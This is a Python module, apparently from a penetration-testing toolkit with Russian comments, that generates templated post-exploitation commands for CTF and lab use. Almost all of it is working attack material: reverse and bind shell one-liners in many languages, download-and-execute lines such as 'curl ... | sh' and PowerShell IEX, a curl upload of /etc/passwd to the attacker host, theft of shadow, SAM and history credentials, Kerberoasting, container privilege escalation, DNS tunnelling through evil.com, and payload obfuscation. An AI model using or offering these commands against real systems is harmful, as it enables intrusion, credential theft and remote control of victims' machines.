"""
Pivot / Post-Exploitation Helpers.
Author: idqwixxa

Генераторы для CTF / лабораторий:
    - Reverse shell one-liners (bash, python, php, perl, ruby, nc, powershell, java, node, go, socat, awk, lua)
    - Bind shell one-liners
    - Shell stabilization (python PTY, script, socat)
    - File transfer (base64, certutil, wget, curl, PowerShell, SMB, FTP, netcat)
    - Pivoting (SSH local/remote/dynamic, socat, chisel, ligolo, proxychains, sshuttle)
    - Port forwarding (netsh, ssh, socat)
    - Linux privesc check (one-liners)
    - Windows privesc check (one-liners)
    - Payload encoding (base64, hex, URL, gzip+base64, PowerShell Base64)

⚠ Только для этичного использования и CTF / лабораторий.
"""
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table

from core.config import config
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)


# ===========================================================================
# Reverse shells
# ===========================================================================

REVERSE_SHELLS = {
    "bash": 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    "bash (mkfifo)": (
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|'
        'nc {lhost} {lport} >/tmp/f'
    ),
    "python3": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "python2": (
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "perl": (
        'perl -e \'use Socket;$i="{lhost}";$p={lport};'
        'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        'if(connect(S,sockaddr_in($p,inet_aton($i))))'
        '{open(STDIN,">&S");open(STDOUT,">&S");'
        'open(STDERR,">&S");exec("/bin/sh -i");};\''
    ),
    "php": (
        'php -r \'$sock=fsockopen("{lhost}",{lport});'
        'exec("/bin/sh -i <&3 >&3 2>&3");\''
    ),
    "php (full)": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "ruby": (
        'ruby -rsocket -e \'exit if fork;'
        'c=TCPSocket.new("{lhost}","{lport}");'
        'while cmd=c.gets;'
        'IO.popen(cmd,"r"){|io|c.print io.read}end\''
    ),
    "nc (mkfifo)": (
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|'
        'nc {lhost} {lport} >/tmp/f'
    ),
    "nc (-e)": f'nc -e /bin/sh {{lhost}} {{lport}}',
    "socat": (
        'socat exec:\'/bin/bash -li\',pty,stderr,setsid,sigint,sane '
        'tcp:{lhost}:{lport}'
    ),
    "awk": (
        'awk \'BEGIN {{s="/inet/tcp/0/{lhost}/{lport}";'
        'for(;s|&getline c;close(c))'
        'while(c|getline)print|&s;close(s);}}\''
    ),
    "lua": (
        'lua -e "require(\\"socket\\");'
        'require(\\"os\\");'
        't=socket.tcp();'
        't:connect(\\"{lhost}\\",\\"{lport}\\");'
        't:send(\\"id\\\\n\\");'
        'while true do '
        'local s,status=t:receive();'
        'local f=io.popen(s);'
        'if f then t:send(f:read(\\"*a\\")..\\"\\\\n\\");'
        'f:close() end end"'
    ),
    "go": (
        'echo \'package main;import"os/exec";import"net";'
        'func main(){c,_:=net.Dial("tcp","{lhost}:{lport}");'
        'cmd:=exec.Command("/bin/sh");'
        'cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && '
        'go run /tmp/t.go'
    ),
    "node.js": (
        "(function(){var net=require(\"net\"),"
        "cp=require(\"child_process\"),"
        "sh=cp.spawn(\"/bin/sh\",[]);"
        "var client=new net.Socket();"
        "client.connect({lport},\"{lhost}\",function(){"
        "client.pipe(sh.stdin);sh.stdout.pipe(client);"
        "sh.stderr.pipe(client);});})();"
    ),
    "powershell": (
        'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
        'New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}) | '
        'ForEach-Object {$s=$_;$st=$_.GetStream();'
        '[byte[]]$b=0..65535|%{0};'
        'while(($i=$st.Read($b,0,$b.Length)) -ne 0){'
        '$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        '$o=(iex $d 2>&1 | Out-String);'
        '$sb=([text.encoding]::ASCII).GetBytes($o);'
        '$st.Write($sb,0,$sb.Length);$st.Flush()};$_.Close()}'
    ),
    "powershell (b64)": (
        "powershell -nop -w hidden -e <BASE64>"
    ),
    "java": (
        'r = Runtime.getRuntime();'
        'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};'
        'cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);'
        'p.waitFor()'
    ),
    "golang (net)": (
        'package main; import ("net";"os/exec";"bufio");'
        'func main(){c,_:=net.Dial("tcp","{lhost}:{lport}");'
        'r:=bufio.NewReader(c);'
        'for { cmd,_:=r.ReadString(\'\\n\');'
        'out,_:=exec.Command("/bin/sh","-c",cmd).CombinedOutput();'
        'c.Write(out) }}'
    ),
    "xterm (msfvenom style)": (
        'msfvenom -p linux/x64/shell_reverse_tcp '
        'LHOST={lhost} LPORT={lport} -f elf -o rev.elf'
    ),
}

# ===========================================================================
# Bind shells
# ===========================================================================

BIND_SHELLS = {
    "nc": 'nc -lvnp {lport} -e /bin/bash',
    "nc (mkfifo)": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l -p {lport} >/tmp/f',
    "python3": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
        "s.bind((\"0.0.0.0\",{lport}));s.listen(1);"
        "c,a=s.accept();"
        "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "socat": 'socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane',
    "php": "php -r '$s=socket_create(AF_INET, SOCK_STREAM, SOL_TCP);socket_bind($s,\"0.0.0.0\",{lport});socket_listen($s);$c=socket_accept($s);while(1){{$i=socket_read($c,1024);socket_write($c,`$i`);}}'",
    "powershell": (
        'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
        '$l=New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{lport});'
        '$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();'
        '[byte[]]$b=0..65535|%{0};$sb=([text.encoding]::ASCII).GetBytes("PS> ");'
        '$s.Write($sb,0,$sb.Length);'
        'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
        '$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        '$o=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($o);'
        '$s.Write($sb,0,$sb.Length);$sb=([text.encoding]::ASCII).GetBytes("PS> ");'
        '$s.Write($sb,0,$sb.Length)}'
    ),
}


# ===========================================================================
# TTY / Shell stabilization
# ===========================================================================

TTY_UPGRADE = {
    "python PTY": (
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    ),
    "python PTY (py2)": (
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    ),
    "script": "script -qc /bin/bash /dev/null",
    "socat (shell side)": (
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
        "tcp:{lhost}:{lport}"
    ),
    "После PTY: Ctrl+Z → stty": (
        "# 1. В reverse shell: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
        "# 2. Нажать Ctrl+Z\n"
        "# 3. На своей машине: stty raw -echo; fg\n"
        "# 4. В шелле: export TERM=xterm; export SHELL=/bin/bash\n"
        "# 5. Если не подхватил размер: stty rows 50 cols 200"
    ),
    "rlwrap (клиент)": "rlwrap nc -lvnp {lport}",
    "Проверка TTY": 'tty  # должно вернуть /dev/pts/N, а не "not a tty"',
}


# ===========================================================================
# File transfer
# ===========================================================================

FILE_TRANSFER = {
    "Python HTTP server (target → we need this on attacker)": (
        "# На атакующем:\n"
        "python3 -m http.server 8000\n\n"
        "# На цели:\n"
        "wget http://{lhost}:8000/file\n"
        "curl -O http://{lhost}:8000/file"
    ),
    "Base64 (small files)": (
        "# На атакующем:\n"
        "base64 -w0 file > file.b64\n\n"
        "# На цели:\n"
        "echo '<paste base64>' | base64 -d > file"
    ),
    "Netcat (push)": (
        "# На атакующем (sender):\n"
        "nc -w 3 -q 0 {lhost} 4444 < file\n\n"
        "# На цели (receiver):\n"
        "nc -lvnp 4444 > file"
    ),
    "Netcat (pull)": (
        "# На цели (sender):\n"
        "nc -w 3 -q 0 {lhost} 4444 < file\n\n"
        "# На атакующем (receiver):\n"
        "nc -lvnp 4444 > file"
    ),
    "Socat (reliable)": (
        "# Атакующий (sender):\n"
        "socat -u FILE:file TCP-LISTEN:4444,reuseaddr\n\n"
        "# Цель (receiver):\n"
        "socat -u TCP:{lhost}:4444 OPEN:file,creat"
    ),
    "Certutil (Windows → file)": (
        "certutil -urlcache -split -f http://{lhost}:8000/file.exe "
        "C:\\\\Temp\\\\file.exe"
    ),
    "Certutil (Windows → base64)": (
        "certutil -decode file.b64 file.exe"
    ),
    "PowerShell DownloadFile": (
        "(New-Object System.Net.WebClient).DownloadFile("
        "'http://{lhost}:8000/file.exe','C:\\\\Temp\\\\file.exe')"
    ),
    "PowerShell IEX (in-memory)": (
        "IEX(New-Object Net.WebClient).DownloadString("
        "'http://{lhost}:8000/script.ps1')"
    ),
    "PowerShell DownloadData": (
        "IEX ([System.Text.Encoding]::Unicode.GetString("
        "(New-Object Net.WebClient).DownloadData('http://{lhost}:8000/s.ps1')))"
    ),
    "SMB (Windows share → target)": (
        "# Атакующий:\n"
        "impacket-smbserver share /tmp -smb2support\n\n"
        "# Цель (Windows):\n"
        "copy \\\\{lhost}\\share\\file.exe C:\\Temp\\file.exe"
    ),
    "SMB (target share → attacker)": (
        "# Цель (Windows):\n"
        "net share share=C:\\Temp /grant:everyone,full\n\n"
        "# Атакующий:\n"
        "smbclient //{target_ip}/share -N\n"
        "smb: \\> get file.exe"
    ),
    "FTP (Windows one-liner)": (
        "echo open {lhost} 21> ftp.txt & echo USER anonymous>> ftp.txt & "
        "echo anonymous>> ftp.txt & echo bin>> ftp.txt & "
        "echo GET file.exe>> ftp.txt & echo bye>> ftp.txt & "
        "ftp -v -n -s:ftp.txt"
    ),
    "TFTP (Windows)": (
        "tftp -i {lhost} GET file.exe"
    ),
    "BITS (Windows, stealth)": (
        "bitsadmin /transfer job /download /priority high "
        "http://{lhost}:8000/file.exe C:\\Temp\\file.exe"
    ),
    "PHP (target → we)": (
        "# Цель (upload):\n"
        "curl -F 'file=@/etc/passwd' http://{lhost}:8000/upload\n\n"
        "# Атакующий (receiver):\n"
        "python3 -c \"from http.server import *; ...\"  # или simple uploader"
    ),
    "Wget (Windows)": (
        "wget.exe http://{lhost}:8000/file.exe -O C:\\Temp\\file.exe"
    ),
}


# ===========================================================================
# Pivoting
# ===========================================================================

PIVOTING = {
    "SSH local forward (-L)": (
        "# Проброс LOCAL:PORT → TARGET:PORT через SSH-сервер\n"
        "ssh -L 8080:internal.host:80 user@{ssh_host}\n"
        "# Теперь http://localhost:8080 → internal.host:80"
    ),
    "SSH remote forward (-R)": (
        "# Проброс с удалённой машины к нам\n"
        "ssh -R 8080:internal.host:80 user@{ssh_host}\n"
        "# Теперь на ssh-сервере: localhost:8080 → internal.host:80"
    ),
    "SSH dynamic SOCKS (-D)": (
        "# SOCKS5 proxy на 1080 через SSH-сервер (pivot)\n"
        "ssh -D 1080 -N -f user@{ssh_host}\n"
        "# Настроить proxychains: socks5 127.0.0.1 1080"
    ),
    "SSH jump host (-J)": (
        "ssh -J user1@{jump1},user2@{jump2} user3@{final_host}"
    ),
    "SSH через proxychains": (
        "# /etc/proxychains4.conf:\n"
        "socks5 127.0.0.1 1080\n\n"
        "proxychains4 nmap -sT -Pn target.internal"
    ),
    "Chisel (reverse tunnel)": (
        "# Атакующий (server):\n"
        "chisel server -p 8080 --reverse\n\n"
        "# Жертва (client):\n"
        "./chisel client {lhost}:8080 R:socks\n"
        "# → SOCKS5 прокси на 127.0.0.1:1080"
    ),
    "Chisel (forward port)": (
        "# Атакующий (server):\n"
        "chisel server -p 8080 --reverse\n\n"
        "# Жертва:\n"
        "./chisel client {lhost}:8080 R:8080:internal.host:80\n"
        "# → localhost:8080 → internal.host:80"
    ),
    "Ligolo-ng": (
        "# Атакующий (proxy):\n"
        "sudo ./proxy -selfcert -laddr 0.0.0.0:11601\n\n"
        "# Жертва (agent):\n"
        "./agent -connect {lhost}:11601 -ignore-cert\n\n"
        "# В proxy:\n"
        "interface_list\n"
        "interface eth0\n"
        "start"
    ),
    "socat (relay)": (
        "# Односторонний релей порта:\n"
        "socat TCP-LISTEN:8080,fork,reuseaddr TCP:internal.host:80\n\n"
        "# Полный TCP-релей через цель (если есть shell):\n"
        "socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80"
    ),
    "socat (двойной pivot)": (
        "# На промежуточной машине (M):\n"
        "socat TCP-LISTEN:9999,fork TCP:final.target:80\n\n"
        "# На атакующем через M:\n"
        "socat TCP-LISTEN:8080,fork TCP:{M_ip}:9999"
    ),
    "sshuttle (VPN over SSH)": (
        "sshuttle -r user@{ssh_host} 10.0.0.0/8 172.16.0.0/12\n"
        "# Прозрачный доступ ко всем внутренним сетям"
    ),
    "Meterpreter autoroute": (
        "meterpreter > run autoroute -s 10.0.0.0/8\n"
        "meterpreter > background\n"
        "msf > use auxiliary/server/socks_proxy\n"
        "msf > set SRVPORT 1080\n"
        "msf > run -j"
    ),
    "Port forward через meterpreter": (
        "meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.5\n"
        "# → localhost:8080 = 10.0.0.5:80"
    ),
    "netsh (Windows portproxy)": (
        "# Перенаправление порта на Windows (нужен админ):\n"
        "netsh interface portproxy add v4tov4 "
        "listenaddress=0.0.0.0 listenport=8080 "
        "connectaddress=10.0.0.5 connectport=80\n"
        "netsh interface portproxy show all\n"
        "netsh advfirewall firewall add rule name=pivot dir=in action=allow protocol=TCP localport=8080"
    ),
    "Pivot через RDP": (
        "# Разрешить на Windows (админ):\n"
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n"
        "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\n\n"
        "# Проброс RDP через SSH:\n"
        "ssh -L 3389:internal.win:3389 user@{ssh_host}"
    ),
    "DNS pivot (dnscat2)": (
        "# Сервер (атакующий):\n"
        "ruby dnscat2.rb --dns \"domain=evil.com,host={lhost}\" --no-cache\n\n"
        "# Клиент (жертва):\n"
        "./dnscat2-v0.07-client-x64 evil.com\n\n"
        "# В сервере: session -i 1, затем shell"
    ),
    "ICMP pivot (ptunnel)": (
        "# Сервер (промежуточная, нужен root):\n"
        "ptunnel -p proxy.target -lp 8000 -da internal.host -dp 80\n\n"
        "# Клиент:\n"
        "ptunnel -p {lhost} -lp 8080 -da internal.host -dp 80"
    ),
    "Proxychains + nmap (TCP connect)": (
        "proxychains4 nmap -sT -Pn -p 22,80,443 target.internal"
    ),
    "Metasploit route через сессию": (
        "msf > route add 10.0.0.0/8 1\n"
        "# где 1 — номер meterpreter-сессии"
    ),
}


# ===========================================================================
# Linux privesc (one-liners)
# ===========================================================================

LINUX_PRIVESC = {
    "SUID бинарники": (
        "find / -perm -u=s -type f 2>/dev/null"
    ),
    "SGID бинарники": (
        "find / -perm -g=s -type f 2>/dev/null"
    ),
    "Capabilities": (
        "getcap -r / 2>/dev/null"
    ),
    "Cron jobs": (
        "cat /etc/crontab; ls -la /etc/cron.*; "
        "crontab -l 2>/dev/null; "
        "cat /etc/cron.d/* 2>/dev/null"
    ),
    "Writable files в /etc": (
        "find /etc -writable -type f 2>/dev/null"
    ),
    "Writable в PATH": (
        "echo $PATH | tr ':' '\\n' | while read d; do "
        "[ -w \"$d\" ] && echo \"WRITABLE: $d\"; done"
    ),
    "Sudo -l": (
        "sudo -l"
    ),
    "Sudo версия (CVE-2021-3156)": (
        "sudo --version | head -3"
    ),
    "Kernel": (
        "uname -a; cat /etc/os-release"
    ),
    "Sudo без пароля": (
        "sudo -n -l 2>/dev/null"
    ),
    "Passwd файл": (
        "cat /etc/passwd | grep -v nologin | grep -v false"
    ),
    "Shadow (если доступен)": (
        "cat /etc/shadow 2>/dev/null"
    ),
    ".bash_history у пользователей": (
        "for u in $(cut -d: -f6 /etc/passwd); do "
        "echo \"=== $u ===\"; cat $u/.bash_history 2>/dev/null; done"
    ),
    "SSH ключи": (
        "find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null"
    ),
    "История": (
        "cat ~/.bash_history ~/.zsh_history 2>/dev/null | "
        "grep -iE 'pass|sudo|ssh|mysql|token'"
    ),
    "NFS (no_root_squash)": (
        "showmount -e {target_ip}\n"
        "# Если есть no_root_squash — монтируем:\n"
        "mkdir /tmp/nfs; mount -t nfs {target_ip}:/export /tmp/nfs"
    ),
    "Docker group": (
        "id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ),
    "LXD group": (
        "id | grep -q lxd && "
        "lxc image import alpine.tar.gz --alias alpine && "
        "lxc init alpine privesc -c security.privileged=true && "
        "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true && "
        "lxc start privesc && lxc exec privesc /bin/sh"
    ),
    "Cron pwnt": (
        "# Проверить python/nginx/etc cron-скрипты на writable\n"
        "ls -la /etc/cron.daily/ /etc/cron.hourly/"
    ),
    "GTFOBins автоматически": (
        "sudo -l | grep -oP '\\(ALL\\) NOPASSWD: \\K.*' | "
        "while read c; do echo \"Check https://gtfobins.github.io/gtfobins/$(basename $c)/\"; done"
    ),
    "LinPEAS (загрузить и запустить)": (
        "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    ),
    "pspy (мониторинг процессов)": (
        "./pspy64 -pf -i 1000  # ловить временные процессы root"
    ),
}


# ===========================================================================
# Windows privesc
# ===========================================================================

WINDOWS_PRIVESC = {
    "whoami /all": (
        "whoami /all"
    ),
    "Privileges": (
        "whoami /priv"
    ),
    "Local admins": (
        "net localgroup Administrators"
    ),
    "Users": (
        "net user"
    ),
    "Группы": (
        "net localgroup"
    ),
    "Службы (unquoted path)": (
        "wmic service get name,displayname,pathname,startmode | "
        "findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\""
    ),
    "Все службы": (
        "sc query state=all"
    ),
    "Задачи в планировщике": (
        "schtasks /query /fo LIST /v"
    ),
    "Автозагрузка": (
        "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run; "
        "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    ),
    "AlwaysInstallElevated": (
        "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated; "
        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
    ),
    "Saved credentials": (
        "cmdkey /list"
    ),
    "WiFi профили": (
        "netsh wlan show profile; "
        "netsh wlan show profile name=\"NAME\" key=clear"
    ),
    "Unattend файлы": (
        "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*sysprep.inf 2>nul"
    ),
    "SAM/SYSTEM (бэкапы)": (
        "dir /a /s C:\\Windows\\System32\\config\\* 2>nul"
    ),
    "Антивирус": (
        "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName"
    ),
    "WinPEAS (загрузить)": (
        "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:8000/winPEAS.ps1')\""
    ),
    "PowerUp": (
        "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\""
    ),
    "PrintSpoofer (SeImpersonate)": (
        ".\\PrintSpoofer.exe -i -c cmd  # если есть SeImpersonatePrivilege"
    ),
    "GodPotato": (
        ".\\GodPotato.exe -cmd \"cmd /c whoami\""
    ),
    "JuicyPotato": (
        ".\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {{CLSID}}"
    ),
    "Unquoted Service Path exploit": (
        "# Пример: путь C:\\Program Files\\Vuln Service\\service.exe\n"
        "# Если папка \"Vuln Service\" writable — положить service.exe\n"
        "icacls \"C:\\Program Files\\Vuln\""
    ),
    "DLL Hijacking (проверка)": (
        "Get-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\*\" | "
        "Where-Object {$_.ImagePath} | Select ImagePath"
    ),
    "Read SAM (если админ)": (
        "reg save HKLM\\SAM C:\\Temp\\sam.hive; "
        "reg save HKLM\\SYSTEM C:\\Temp\\system.hive; "
        "# Скачать оба на атакующего:\n"
        "impacket-secretsdump -sam sam.hive -system system.hive LOCAL"
    ),
    "Kerberoasting (impacket)": (
        "impacket-GetUserSPNs domain/user:pass -dc-ip {dc_ip} -request"
    ),
    "AS-REP Roasting": (
        "impacket-GetNPUsers domain/ -dc-ip {dc_ip} -usersfile users.txt -format hashcat -outputfile asrep.txt"
    ),
}


# ===========================================================================
# Payload encoding
# ===========================================================================

PAYLOAD_ENCODING = {
    "Bash base64 exec": (
        'echo "BASH_COMMAND" | base64 -w0\n'
        '# На цели:\n'
        'echo "BASE64_STRING" | base64 -d | bash'
    ),
    "PowerShell Base64 (UTF-16LE)": (
        '# Кодирование:\n'
        'PS> $cmd = "COMMAND"; '
        '$b = [System.Text.Encoding]::Unicode.GetBytes($cmd); '
        '[Convert]::ToBase64String($b)\n'
        '# Запуск:\n'
        'powershell -EncodedCommand BASE64'
    ),
    "Python exec base64": (
        'import base64; exec(base64.b64decode("BASE64"))'
    ),
    "PHP eval base64": (
        'php -r \'eval(base64_decode("BASE64"));\''
    ),
    "URL encode": (
        '# Python:\n'
        'python3 -c "import urllib.parse; print(urllib.parse.quote(open(\'payload.txt\').read()))"'
    ),
    "Hex encode": (
        '# Python:\n'
        'python3 -c "print(open(\'payload.txt\',\'rb\').read().hex())"'
    ),
    "XOR (single byte)": (
        '# Python:\n'
        'python3 -c "d=open(\'payload.bin\',\'rb\').read(); k=0x42; print(bytes(b^k for b in d).hex())"'
    ),
    "Gzip + base64": (
        '# Сжатие + кодирование:\n'
        'gzip -c payload | base64 -w0\n\n'
        '# На цели:\n'
        'echo "STRING" | base64 -d | gunzip > payload'
    ),
    "PowerShell IEX base64": (
        'powershell -nop -w hidden -e BASE64_UTF16LE'
    ),
    "Certutil decode base64": (
        '# Сохранить base64 в file.b64, потом:\n'
        'certutil -decode file.b64 file.exe'
    ),
    "ECHO + certutil (Windows upload)": (
        '# Разбить base64 на строки, склеить через echo:\n'
        'echo BASE64_PART1 > file.b64\n'
        'echo BASE64_PART2 >> file.b64\n'
        'certutil -decode file.b64 file.exe'
    ),
}


# ===========================================================================
# Утилиты вывода
# ===========================================================================

def _print_dict_commands(d: dict, title: str, lhost: str = "",
                        lport: str = "4444", target_ip: str = "") -> None:
    """Показать словарь команд с подстановкой параметров."""
    for name, cmd in d.items():
        try:
            formatted = cmd.format(lhost=lhost or "LHOST",
                                  lport=lport, target_ip=target_ip or "TARGET")
        except Exception:
            formatted = cmd
        table = Table(title=f"[bold cyan]{name}[/bold cyan]",
                      show_header=False, border_style="dim")
        table.add_column("Command")
        for line in formatted.split("\n"):
            table.add_row(f"[green]{line}[/green]")
        console.print(table)


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🔀 Pivot / Post-Exploitation Helpers[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Reverse shell one-liners"),
        ("2", "Bind shell one-liners"),
        ("3", "TTY / Shell stabilization"),
        ("4", "File transfer techniques"),
        ("5", "Pivoting (SSH, socat, chisel, ligolo)"),
        ("6", "Linux privesc check"),
        ("7", "Windows privesc check"),
        ("8", "Payload encoding"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для этичного использования и CTF / лабораторий.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        cli_reverse_shells()
    elif c == "2":
        cli_bind_shells()
    elif c == "3":
        cli_tty_upgrade()
    elif c == "4":
        cli_file_transfer()
    elif c == "5":
        cli_pivot()
    elif c == "6":
        cli_linux_privesc()
    elif c == "7":
        cli_windows_privesc()
    elif c == "8":
        cli_payload_encoding()


# ===========================================================================
# CLI-функции
# ===========================================================================

def cli_reverse_shells(lhost: str | None = None,
                       lport: str | None = None) -> None:
    if not lhost:
        lhost = Prompt.ask("LHOST (твой IP)", default="10.0.0.1")
    if not lport:
        lport = Prompt.ask("LPORT", default="4444")

    console.print(f"\n[bold cyan]💀 Reverse shells → {lhost}:{lport}[/bold cyan]\n")
    _print_dict_commands(REVERSE_SHELLS, "Reverse shells", lhost, lport)
    db.save_scan("pivot", "revshell", {"lhost": lhost, "lport": lport})


def cli_bind_shells(lport: str | None = None) -> None:
    if not lport:
        lport = Prompt.ask("LPORT (на цели)", default="4444")
    console.print(f"\n[bold cyan]🎯 Bind shells на порту {lport}[/bold cyan]\n")
    _print_dict_commands(BIND_SHELLS, "Bind shells", lport=lport)


def cli_tty_upgrade(lhost: str | None = None,
                    lport: str | None = None) -> None:
    lhost = lhost or Prompt.ask("LHOST", default="10.0.0.1")
    lport = lport or Prompt.ask("LPORT", default="4444")
    console.print("\n[bold cyan]🖥  TTY / Shell stabilization[/bold cyan]\n")
    _print_dict_commands(TTY_UPGRADE, "TTY", lhost, lport)


def cli_file_transfer(lhost: str | None = None,
                      target_ip: str | None = None) -> None:
    lhost = lhost or Prompt.ask("LHOST (твой IP)", default="10.0.0.1")
    target_ip = target_ip or Prompt.ask("TARGET_IP (цель, если нужно)",
                                        default="")
    console.print("\n[bold cyan]📁 File transfer[/bold cyan]\n")
    _print_dict_commands(FILE_TRANSFER, "File transfer",
                        lhost, target_ip=target_ip)


def cli_pivot(lhost: str | None = None, lport: str | None = None,
              target_ip: str | None = None) -> None:
    lhost = lhost or Prompt.ask("LHOST", default="10.0.0.1")
    lport = lport or Prompt.ask("LPORT", default="4444")
    target_ip = target_ip or Prompt.ask("TARGET_IP", default="10.0.0.5")
    console.print("\n[bold cyan]🔀 Pivoting[/bold cyan]\n")
    _print_dict_commands(PIVOTING, "Pivoting", lhost, lport, target_ip)


def cli_linux_privesc(target_ip: str | None = None) -> None:
    target_ip = target_ip or Prompt.ask("TARGET_IP (если нужно)",
                                        default="10.0.0.5")
    console.print("\n[bold cyan]🐧 Linux privesc[/bold cyan]\n")
    _print_dict_commands(LINUX_PRIVESC, "Linux privesc",
                        target_ip=target_ip)


def cli_windows_privesc(lhost: str | None = None) -> None:
    lhost = lhost or Prompt.ask("LHOST (для загрузки WinPEAS)",
                                default="10.0.0.1")
    console.print("\n[bold cyan]🪟 Windows privesc[/bold cyan]\n")
    _print_dict_commands(WINDOWS_PRIVESC, "Windows privesc", lhost=lhost)


def cli_payload_encoding() -> None:
    console.print("\n[bold cyan]🔐 Payload encoding[/bold cyan]\n")
    _print_dict_commands(PAYLOAD_ENCODING, "Payload encoding")


# Быстрые функции (без аргументов) для TUI
def quick_reverse() -> None:
    _print_dict_commands(REVERSE_SHELLS, "Reverse shells",
                        "LHOST", "4444")


def quick_bind() -> None:
    _print_dict_commands(BIND_SHELLS, "Bind shells", lport="4444")


def quick_tty() -> None:
    _print_dict_commands(TTY_UPGRADE, "TTY", "LHOST", "4444")


def quick_transfer() -> None:
    _print_dict_commands(FILE_TRANSFER, "File transfer", "LHOST")


def quick_pivot() -> None:
    _print_dict_commands(PIVOTING, "Pivoting", "LHOST", "4444", "TARGET")


def quick_linux_privesc() -> None:
    _print_dict_commands(LINUX_PRIVESC, "Linux privesc")


def quick_windows_privesc() -> None:
    _print_dict_commands(WINDOWS_PRIVESC, "Windows privesc", lhost="LHOST")


def quick_encoding() -> None:
    _print_dict_commands(PAYLOAD_ENCODING, "Payload encoding")